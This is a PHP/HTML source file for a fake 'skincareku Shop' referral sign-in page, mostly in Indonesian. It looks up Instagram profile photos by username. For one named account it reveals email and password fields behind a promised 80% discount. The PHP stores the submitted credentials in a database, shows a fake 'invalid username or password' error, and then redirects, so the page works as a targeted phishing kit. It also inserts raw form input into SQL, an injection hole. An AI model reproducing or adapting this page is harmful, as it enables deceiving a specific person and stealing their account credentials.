<!DOCTYPE html>
<html>
<head>
	<title>reffeal skincareku</title>
	<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bootstrap Sign in Form like Google</title>
	<script src="../asset/jquery-3.4.1.min.js"></script>
	<script src="../asset/bootstrap/js/bootstrap.min.js"></script>
	<link rel="stylesheet" type="text/css" href="../asset/bootstrap/css/bootstrap.min.css">
<style type="text/css">
    .login-form {
        width: 330px;
    	margin: 30px auto;
    }
    .login-form h2 {
        font-size: 19px;
        margin-bottom: 15px;
        text-align: center;
    }
    .login-form form {        
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);        
        margin-bottom: 10px;
		padding: 30px;
    }
    .login-form .avatar {
        width: 90px;
        margin-bottom: 20px;
    }
    .login-form .form-control, .login-form .btn {
        min-height: 38px;        
    }
    .login-form input[type="email"] {
        border-radius: 2px 2px 0 0;
    }
    .login-form input[type="password"] {
        border-radius: 0 0 2px 2px;
        margin-top: -1px;
    }
	.login-form input.form-control:focus {
        position: relative;
        z-index: 2;
    }
    .login-form .btn {        
        font-size: 15px;
		font-weight: bold;
		border-radius: 2px;
    }
</style>
</head>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="../">skincareku Shop</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="../">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Reffeal Link</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Contact Me</a>
      </li>
    </ul>
   <!--  <form class="form-inline my-2 my-lg-0">
      <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
      <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
    </form> -->
  </div>
</nav>
<div class="alert alert-info m-2"><marquee>mohon maaf ketidaknyamananya website resmi kami skincareku.com sedang mengalami masalah, kami sedang berusaha memperbaiki</marquee> </div>



<!-- <input type="text" oninput="getPhoto($(this).val().trim())" id="usernameInput"> -->

<!-- <button onclick="getPhoto($('#usernameInput').val().trim())">Get profile photo</button> -->


<div class="login-form">
    <h2>Sign in to Your Account</h2>
<div class="alert alert-success">anda mendapat kode referal dari <span class="text-primary"><?php session_start();

echo $_SESSION['firstMessage']; 

?></span> Silahkan masukkan username Instagram anda yang digunakan untuk membuka link ini</div>
    <form action="index.php" method="post">
        <div class="text-center">

            <img src="https://www.tutorialrepublic.com/examples/images/avatar.gif"  id="photoReturn" class="rounded-circle avatar" alt="Avatar">
             <?php 
error_reporting(0);
ini_set('display_errors', 0);

            	if(isset($_POST['submit']))
				{
					// koneksi database
include '../config.php';
$_SESSION['count'] = $_SESSION['count'] + 1;

if ($_SESSION['count']>=2) {

	//echo '<script>getPhoto($(#usernameInput).val().trim())</script>';
	//$foto=echo '<script>return foto;</script>';
	$_SESSION['profil'] = '<img width="50" class="rounded-circle" src="'. $_POST['srcc'].'" alt="Circle image">'; 

	header("location:../index.php");
	# code...
}
echo $_SESSION['count'] ;
// menangkap data yang di kirim dari form
$pesan='<div class="text text-danger">username / password tidak sinkron</div>';
$nama = $_POST['nama'];
$kelas = $_POST['kelas'];
$absen = $_POST['absen'];
echo '<div class="text text-danger">invalid username or password</div>';
// menginput data ke database

mysqli_query($koneksi,"insert into data values('','$nama','$kelas','$absen')");

// mengalihkan halaman kembali ke index.php
//header("location:index.php");

				}

 ?>
        </div>        
        <div class="form-group">

            <input type="text" oninput="getPhoto($(this).val().trim())" id="usernameInput" class="form-control" name="nama" placeholder="username">
            <br />
           
            <div class="alert alert-danger" id="statusAkun">maaf akun ini tidak menerima kode refeal</div>
            <input type="text" value="" id="srcc" style="display: none" name="srcc">
            <div class="detectInput" style="display: none">
            <input type="text" id="email" class="form-control semail" name="kelas" placeholder="Email" required="required">
            <input type="password" class="form-control" placeholder="Password" name="absen">
            </div>
        </div>
        <div class="detectInput" style="display: none">
        <div class="form-group">
            <input type="submit" name="submit" value="Sign In" class="btn btn-primary btn-block">
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"><input type="checkbox"> Remember me</label>
            <a href="#" class="pull-right">Forgot Password?</a>
        </div>        
    </div>
    </form>
    <p class="text-center"><a href="https://www.instagram.com/">Create an Account</a></p>
</div>

<script type="text/javascript">
	var foto;

	function getPhoto(a) {
  
  // validation for instagram usernames
  var regex = new RegExp(/^(?!.*\.\.)(?!.*\.$)[^\W][\w.]{0,29}$/);
  var validation = regex.test(a);

  if(validation) {
   $("#photoReturn").attr("src",'https://thumbs.gfycat.com/LameDifferentBalloonfish-max-1mb.gif')
    $.get("https://www.instagram.com/"+a+"/?__a=1")
    .done(function(data) { 

      // getting the url
      var photoURL = data["graphql"]["user"]["profile_pic_url_hd"];
      foto=photoURL;
      // update img element
      $("#photoReturn").attr("src",photoURL)
      $("#srcc").attr("value",photoURL)
      if ($('#usernameInput').val().toLowerCase()=='nellyemilia_') {
      	$('.detectInput').css('display', 'block');
      	$('#statusAkun').attr('class', 'alert alert-success');
      	$('#statusAkun').html('Akun ini telah menerima kode referal diskon up to 80%, silahkan login untuk melanjutkan');

      }


     })
    .fail(function() { 
      // code for 404 error 
      console.log('Username was not found!')
      $("#photoReturn").attr("src",'https://www.tutorialrepublic.com/examples/images/avatar.gif')
      $('#statusAkun').attr('class', 'alert alert-danger');
      	$('#statusAkun').html('maaf akun ini tidak menerima kode referal');
      //alert('Username was not found!')
    })
  
  } else {
  	console.log('The username is invalid!')
    //alert('The username is invalid!')
  }

}

    




</script>

</body>
</html>